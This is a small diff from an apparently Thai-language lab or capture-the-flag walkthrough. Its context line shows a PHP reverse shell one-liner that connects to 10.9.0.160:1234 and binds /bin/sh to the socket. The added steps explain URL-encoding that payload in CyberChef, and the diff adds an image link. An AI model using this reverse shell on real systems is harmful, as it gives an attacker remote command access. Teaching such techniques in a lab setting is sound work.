@@ -279,3 +279,5 @@ php -r '$sock=fsockopen("10.9.0.160",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 2. วางลงใน CyberChef
 3. ทางซ้ายให้ค้นหาและลากสูตร “URL Encode” เข้ามาใช้
 4. CyberChef จะแปลง payload ให้กลายเป็นรูปแบบ URL-safe
+
+![chef](images/17.png)
